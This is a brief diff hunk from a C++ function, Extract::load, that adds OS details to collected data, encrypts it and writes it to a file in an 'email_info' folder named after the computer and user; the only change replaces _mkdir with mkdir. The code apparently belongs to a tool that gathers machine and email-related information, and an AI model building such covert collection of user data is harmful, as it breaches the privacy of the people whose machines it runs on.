@@ -145,7 +145,7 @@ int Extract::load(string projector_file) {
     j = add_os_info(j);
     string encryp = my_encryption(j);
     
-    _mkdir(".\\email_info"); 
+    mkdir(".\\email_info"); 
     string name = get_computer_name() + "-" + get_user_name();
     ofstream out("email_info\\" + name + ".txt");
     out << encryp;
